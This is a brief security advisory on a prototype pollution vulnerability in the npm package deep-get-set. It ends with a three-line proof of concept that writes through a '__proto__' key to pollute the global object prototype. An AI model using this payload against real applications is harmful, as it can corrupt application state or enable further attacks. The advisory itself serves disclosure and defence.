# Overview

`deep-get-set` is a Set and get values on objects via dot-notation strings.

Affected versions of this package are vulnerable to Prototype Pollution via the main function.

# Proof of Concept
```
const deep = require('deep-get-set');
deep({}, ['__proto__', 'polluted'], true);
console.log(polluted);
```